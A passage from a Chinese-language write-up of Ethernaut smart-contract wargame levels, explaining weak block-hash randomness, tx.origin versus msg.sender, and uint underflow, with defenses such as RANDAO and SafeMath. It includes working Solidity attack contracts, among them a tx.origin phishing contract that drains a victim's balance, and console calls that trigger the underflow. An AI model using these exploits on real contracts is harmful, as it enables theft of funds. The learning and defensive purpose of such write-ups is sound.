    pragma solidity ^0.4.18;
    contract CoinFlip {
        function flip(bool _guess) public returns (bool);
    }
    contract CoinFlipHack {
        CoinFlip coinflip;
        uint256 lastHash;
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        function CoinFlipHack(address _addr) public {
            coinflip = CoinFlip(_addr);
        }
        function hack() public returns (bool) {
            uint256 blockValue = uint256(block.blockhash(block.number-1));
            if (lastHash == blockValue) {
              revert();
            }
            lastHash = blockValue;
            uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
            bool side = coinFlip == 1 ? true : false;
            return coinflip.flip(side);
        }
    }
如果对如何在 remix 上部署合约不熟悉，可以再去 Google 一下（逃
下面回来再看本题暴露的问题：以太坊中不安全的随机数。以太坊区块链上的所有交易都是确定性的状态转换操作，每笔交易都会改变以太坊生态系统的全球状态，并且是以一种可计算的方式进行，这意味着其没有任何的不确定性。所以在区块链生态系统内，不存在熵或随机性的来源。如果使用可以被挖矿的矿工所控制的变量，如区块哈希值，时间戳，区块高低或是
Gas 上限等作为随机数的熵源，产生的随机数并不安全。Arseny Reutov 所写的一篇博文仔细讨论了用区块变量作为熵源的缺陷：[Predicting
Random Numbers in Ethereum Smart
Contracts](https://blog.positive.com/predicting-random-numbers-in-ethereum-smart-contracts-e5358c6b8620)。
解决该问题可选的方案有 [RANDAO](https://github.com/randao/randao) 或
[Oraclize](http://www.oraclize.it/) 等，以去中心化的方式或是与外界互联网交互的方式得到安全的随机数。
## Telephone - 区分 `tx.origin` 和 `msg.sender`
首先我们来看题目要求：获得合约的所属权。
来看一下代码中对合约所属权的操作：
    pragma solidity ^0.4.18;
    contract Telephone {
      address public owner;
      function Telephone() public {
        owner = msg.sender;
      }
      function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
          owner = _owner;
        }
      }
    }
可以看到代码很简单，只要满足 `tx.origin != msg.sender` 即可触发 owner
的修改。但在不了解的人看来，这两个变量在很多情况下是等价的（比如我）。但既然题目的考点存在，这二者必然存在着较大的不同。
我们可以看一下 solidity 文档对 `tx.origin` 以及 `msg.sender` 的定义：
  * `msg.sender` (`address`): 消息发送者（当前调用）
  * `tx.origin` (`address`): 交易发起者（完全的调用链）
虽然在某些情况下 `msg.sender` 即 `tx.origin`，但二者并非完全等价。`msg.sender`
是函数的直接调用方，在用户手动调用该函数时是发起交易的账户地址，但也可以是调用该函数的一个智能合约的地址。而 `tx.origin`
则必然是这个交易的原始发起方，无论中间有多少次合约内/跨合约函数调用，而且一定是账户地址而不是合约地址。所以如果存在用户通过合约 A 调用合约
B，那么对应合约 B 而言，`msg.sender` 是合约 A 地址，但 `tx.origin` 是用户的账户地址，如下图所示：
所以我们可以通过编写智能合约的方式来满足题目要求的条件：
我们编写了合约 `TelephoneHack` ，在该合约的 `changeOwner` 函数中，会调用 `Telephone` 合约的
`changeOwner` 函数。然后用户手动调用 `TelephoneHack` 的 `changeOwner` 函数，即可触发上述条件。
在完成挑战后，题目提醒我们需要注意的是 `tx.origin` 和 `msg.sender` 的区别，否则可能出现利用将 tx.origin
用作身份验证的智能合约进行钓鱼式攻击的问题。
如果存在合约如下，它使用了 `tx.origin` 作为校验的依据：
    pragma solidity ^0.4.18;
    contract TxOriginVictim {
      address owner;
      function TxOriginVictim() {
        owner = msg.sender;
      }
      function transferTo(address to, uint amount) public {
        require(tx.origin == owner);
        to.call.value(amount)();
      }
      function() payable public {}
    }
那么攻击者可以尝试构造以下合约：
    pragma solidity ^0.4.18;
    interface TxOriginVictim {
      function transferTo(address to, uint amount);
    }
    contract TxOriginAttacker {
      address owner;
      function TxOriginAttacker() public {
        owner = msg.sender;
      }
      function getOwner() public returns (address) {
        return owner;
      }
      function() payable public {
        TxOriginVictim(msg.sender).transferTo(owner, msg.sender.balance);
      }
    }
然后攻击者只要以某种方式（比如钓鱼）说服 `TxOriginVictim` 合约的拥有者向该合约发送一定的 ETH 以触发 `fallback`
函数，由于该函数又会调用 `TxOriginVictim` 合约的 `transferTo` 函数，此时函数中的 `tx.origin==owner`
条件满足，合约会向攻击者转走所有资金。钓鱼攻击，成功√
解决该问题的方式很简单，我们需要慎重考虑使用 `tx.origin` 的问题，但不排除其正常的使用方式，比如通过 `require(tx.origin ==
msg.sender)` 限制外部合约对内部合约的调用。
## Token - 整数下溢
上来先看题目要求，我们初始状态时有 20 tokens，然后我们需要想办法让 tokens 增长到超过 20，简单说就是“开局 20 刀，发财全靠搞”（误
    pragma solidity ^0.4.18;
    contract Token {
      mapping(address => uint) balances;
      uint public totalSupply;
      function Token(uint _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
      }
      function transfer(address _to, uint _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
      }
      function balanceOf(address _owner) public view returns (uint balance) {
        return balances[_owner];
      }
    }
看完源码之后内心一凉，我们唯二的两个函数，一个是向别人转 token，一个是看自己还剩多少 token，根本没有任何办法给自己账户增加余额。。
当然办法还是有的，我们可以看到题目中所有和 token 的变量，都是 `uint` 类型的，根据定义，`int` / `uint`
分别表示有符号和无符号的不同位数的整型变量，所以我们所有的减法操作都是无符号整数的减法操作，这就带来了一个很明显的问题：整数下溢。
在 solidity 中 `uint` 默认为 256 位无符整型，可表示范围 `[0,
2**256-1]`，在上面的代码中通过直接做减法的方式来进行操作，会使得结果可能由于整数下溢而大于 0（示意图如下）：
那么我们的方法就很简单了，想办法在 `transfer` 函数中触发整数下溢，具体操作如下：
    // 转给谁不重要，关键是利用 20-21 触发整数下溢
    await contract.transfer(0, 21);
    // 可以看一下自己现在的 token 有多少（非常之多）
    await contract.balanceOf(player);
    /* output
    t {s: 1, e: 77, c: Array(6)}
    c: (6) [11579208, 92373161954235, 70985008687907, 85326998466564, 5640394575840, 7913129639914]
    e: 77
    s: 1
    __proto__: Object
    */
虽然整数溢出问题非常简单，但是因此引发的区块链安全问题不是少数，比如["一行代码蒸发六十亿"](https://segmentfault.com/a/1190000014531999)，["代币变泡沫，以太坊Hexagon溢出漏洞"](https://www.anquanke.com/post/id/145520)，开发者对整数溢出漏洞的忽视最终将导致惨痛的后果。
但也并非没有办法来处理该问题，最简单的处理是在每一次数学运算时进行判断，如 `a=a+b;`，就可以写成 `if(a+b>a)
a=a+b;`。题目建议的另一种解决方案则是使用 OpenZeppelin 团队开发的 SafeMath
库，如果整数溢出漏洞发生时，函数将进行回退操作，此时加法操作可以写作这样：`a=a.add(b);`
## 参考文章
  1. [以太坊智能合约漏洞利用实战writeup](https://zhuanlan.zhihu.com/p/38573744)
  2. [从Ethernaut学习智能合约审计(一)](https://www.bubbles966.cn/blog/2018/05/05/analyse_dapp_by_ethernaut/)
  3. [Solidity 中文文档](https://solidity-cn.readthedocs.io/)
  4. [以太坊智能合约安全入门了解一下（上）](http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilites-review/)
  5. [以太坊智能合约安全入门了解一下（下）](http://rickgray.me/2018/05/26/ethereum-smart-contracts-vulnerabilities-review-part2/)
  6. [干货 | Solidity 安全：已知攻击方法和常见防御模式综合列表，Part-1：可重入漏洞、算法上下溢出](https://ethfans.org/posts/comprehensive-list-of-common-attacks-and-defense-part-1)
  7. [干货 | Solidity 安全：已知攻击方法和常见防御模式综合列表，Part-3：默认可见性、随机数误区](https://ethfans.org/posts/comprehensive-list-of-common-attacks-and-defense-part-3)
  8. [干货 | Solidity 安全：已知攻击方法和常见防御模式综合列表，Part-7：构造函数失控、未初始化的存储指针](https://ethfans.org/ajian1984/articles/33425)
  9. [干货 | Solidity 安全：已知攻击方法和常见防御模式综合列表，Part-8：浮点和精度、Tx.Origin 用作身份验证](https://ethfans.org/posts/comprehensive-list-of-common-attacks-and-defense-part-8)
## 写在最后
萌新刚刚入门区块链，如果发现错误，希望各位大佬不吝批评指正 ⧸⎩⎠⎞͏(・∀・)⎛͏⎝⎭⧹